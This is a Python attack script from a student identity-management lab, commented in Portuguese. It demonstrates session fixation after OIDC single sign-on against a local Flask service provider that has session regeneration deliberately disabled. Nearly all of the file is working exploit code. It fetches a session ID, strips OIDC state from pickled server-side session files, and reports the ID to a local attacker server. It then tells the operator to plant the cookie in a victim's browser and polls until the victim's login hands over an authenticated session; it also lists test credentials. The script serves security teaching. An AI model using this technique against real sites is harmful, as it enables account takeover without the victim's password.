#!/usr/bin/env python3
"""
A-09 — Session Fixation after SSO
GID Lab — Grupo 4

Demonstra como um atacante pode fixar um session ID no SP1 e, após
a vítima fazer login com esse ID, ganhar acesso autenticado sem
conhecer as credenciais.

Pré-requisitos:
  - SP1 a correr em http://localhost:5001
  - VULN_A09_NO_SESSION_REGEN = True em sp1/config.py
  - flask-session instalado no SP1 (sessões server-side)

Utilização:
  python attacks/a09_session_fixation.py
"""

import glob
import http.cookiejar
import os
import pickle
import sys
import time
import urllib.request
import urllib.parse

SP1_BASE      = "http://localhost:5001"
ATTACKER_BASE = "http://localhost:9999"

# Locais possíveis do directório de sessões do Flask-Session
FLASK_SESSION_DIRS = [
    "./flask_session",
    "./sp1/flask_session",
    os.path.join(os.path.dirname(__file__), "..", "flask_session"),
]

LINE = "=" * 60

def print_step(n, title):
    print(f"\n{LINE}")
    print(f"  PASSO {n}: {title}")
    print(LINE)


def get_fresh_session_id():
    """
    Visita /login do SP1 sem seguir o redirect para o Keycloak.
    O Flask-Session cria a sessão e devolve Set-Cookie nesta resposta.
    """
    jar = http.cookiejar.CookieJar()

    class NoRedirect(urllib.request.HTTPRedirectHandler):
        def http_error_302(self, req, fp, code, msg, headers):
            raise urllib.error.HTTPError(req.full_url, code, msg, headers, fp)
        http_error_301 = http_error_302
        http_error_303 = http_error_302

    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(jar),
        NoRedirect()
    )

    try:
        opener.open(f"{SP1_BASE}/login")
    except urllib.error.HTTPError:
        pass   # redirect esperado (para Keycloak) — o cookie já foi capturado
    except Exception as e:
        print(f"  [ERRO] Não foi possível contactar SP1: {e}")
        sys.exit(1)

    for cookie in jar:
        if cookie.name == "sp1_session":
            return cookie.value

    return None


def clean_oidc_state():
    """
    Remove as chaves de estado OIDC da sessão mais recente no disco.
    Isto evita MismatchingStateError quando a vítima inicia um novo
    fluxo de login com o cookie fixado.

    As chaves seguem o padrão: _state_keycloak_*
    Formato do ficheiro: 4 bytes (expiração) + pickle do dict.
    """
    for session_dir in FLASK_SESSION_DIRS:
        if not os.path.isdir(session_dir):
            continue

        files = sorted(
            glob.glob(os.path.join(session_dir, "*")),
            key=os.path.getmtime,
            reverse=True
        )
        if not files:
            continue

        newest = files[0]
        try:
            with open(newest, "rb") as f:
                header = f.read(4)        # 4 bytes de expiração (cachelib)
                data = pickle.load(f)

            oidc_keys = [k for k in data if "_state_" in k or "_nonce_" in k
                         or k in ("state", "nonce")]
            if oidc_keys:
                for k in oidc_keys:
                    del data[k]
                with open(newest, "wb") as f:
                    f.write(header)
                    pickle.dump(data, f)
                print(f"  ✅ Estado OIDC removido da sessão: {oidc_keys}")
            else:
                print(f"  ✅ Sessão limpa (sem estado OIDC)")
            return True
        except Exception as e:
            print(f"  [AVISO] Não foi possível limpar ficheiro de sessão: {e}")
            continue

    print("  [AVISO] Directório flask_session não encontrado — continua sem limpeza.")
    return False


def check_authenticated_access(session_id):
    """
    Tenta aceder ao dashboard do SP1 usando o session ID fornecido.
    Devolve True se o acesso for autenticado (sem redirect para login).
    """
    class NoRedirect(urllib.request.HTTPRedirectHandler):
        def http_error_302(self, req, fp, code, msg, headers):
            raise urllib.error.HTTPError(req.full_url, code, msg, headers, fp)
        http_error_301 = http_error_302
        http_error_303 = http_error_302

    req = urllib.request.Request(f"{SP1_BASE}/dashboard")
    req.add_header("Cookie", f"sp1_session={session_id}")

    try:
        opener = urllib.request.build_opener(NoRedirect())
        opener.open(req)
        return True   # Sem redirect = autenticado
    except urllib.error.HTTPError as e:
        if e.code in (301, 302, 303):
            return False  # Redirect para login = não autenticado
        return False
    except Exception:
        return False


def main():
    print(f"\n{'#'*60}")
    print(f"#  A-09 — Session Fixation Demonstração  #")
    print(f"#  GID Lab Grupo 4                        #")
    print(f"{'#'*60}")

    # ------------------------------------------------------------------
    # PASSO 1: Atacante obtém um session ID do SP1
    # ------------------------------------------------------------------
    print_step(1, "Atacante obtém session ID do SP1")
    print(f"\n  Visitando {SP1_BASE}/login sem completar o fluxo OIDC...")

    sid = get_fresh_session_id()
    if not sid:
        print("\n  [ERRO] Não foi possível obter session ID.")
        print("  Certifica-te que o SP1 está a correr e usa flask-session.")
        sys.exit(1)

    print(f"\n  ✅ Session ID obtido:")
    print(f"     sp1_session = {sid}")

    # Limpar o estado OIDC da sessão para evitar MismatchingStateError
    print(f"\n  A limpar estado OIDC da sessão no servidor...")
    clean_oidc_state()

    # ------------------------------------------------------------------
    # PASSO 2: Registar o session ID no attacker server
    # ------------------------------------------------------------------
    print_step(2, "Registar session ID no attacker server")
    try:
        url = f"{ATTACKER_BASE}/fixate?sid={urllib.parse.quote(sid)}"
        resp = urllib.request.urlopen(url)
        data = resp.read().decode()
        print(f"\n  ✅ Registado: {data[:120]}")
    except Exception as e:
        print(f"\n  [AVISO] Attacker server não respondeu: {e}")

    # ------------------------------------------------------------------
    # PASSO 3: Instruções para a vítima
    # ------------------------------------------------------------------
    print_step(3, "Injectar o cookie na vítima (instrução manual)")
    print(f"""
  ⚠️  SEQUÊNCIA OBRIGATÓRIA (3 passos):

  ① Navega para http://localhost:5001
    → o browser é redireccionado para o Keycloak (login do Keycloak)
    → NÃO faças login — fica nessa página

  ② Abre DevTools (F12) → Application → Cookies → http://localhost:5001
    → Duplo-clique no VALOR de sp1_session → substitui por:

      {sid}

    Confirma que o valor foi alterado.

  ③ Navega novamente para http://localhost:5001  ← PASSO CRÍTICO
    → o SP1 recebe o cookie fixado e inicia um NOVO fluxo OIDC
    → o browser vai para o Keycloak outra vez (nova página de login)
    → AGORA faz login com:
        Username: bob
        Password: bob123

  ➜ O OIDC callback será processado com o session ID do atacante!
""")

    # ------------------------------------------------------------------
    # PASSO 4: Aguardar que a vítima faça login
    # ------------------------------------------------------------------
    print_step(4, "Aguardar login da vítima...")
    print("\n  A verificar acesso de 10 em 10 segundos.")
    print("  (Ctrl+C para parar)\n")

    attempts = 0
    max_attempts = 30   # 5 minutos

    try:
        while attempts < max_attempts:
            attempts += 1
            is_auth = check_authenticated_access(sid)

            status = "✅ AUTENTICADO!" if is_auth else "⏳ aguardando login..."
            print(f"  [{attempts:02d}/{max_attempts}] {status}", end="\r", flush=True)

            if is_auth:
                # ------------------------------------------------------------------
                # PASSO 5: Acesso bem-sucedido com o session ID fixo
                # ------------------------------------------------------------------
                print_step(5, "ATAQUE BEM-SUCEDIDO!")
                print(f"""
  O atacante acede ao SP1 com o session ID fixo:

    curl -s http://localhost:5001/dashboard \\
         -b "sp1_session={sid}" \\
         -L

  Ou no browser do atacante, define o cookie e acede ao dashboard:

    document.cookie = "sp1_session={sid}; path=/";
    // depois navega para http://localhost:5001/dashboard

  ➜ O atacante tem acesso à sessão autenticada de bob SEM saber
    a sua password!
""")
                print(f"\n  Cookie a usar:")
                print(f"  sp1_session={sid}")
                return

            time.sleep(10)

    except KeyboardInterrupt:
        pass

    print(f"\n\n  [TIMEOUT] A vítima não fez login em {max_attempts * 10}s.")
    print(f"  O session ID ainda é: {sid}")


if __name__ == "__main__":
    main()
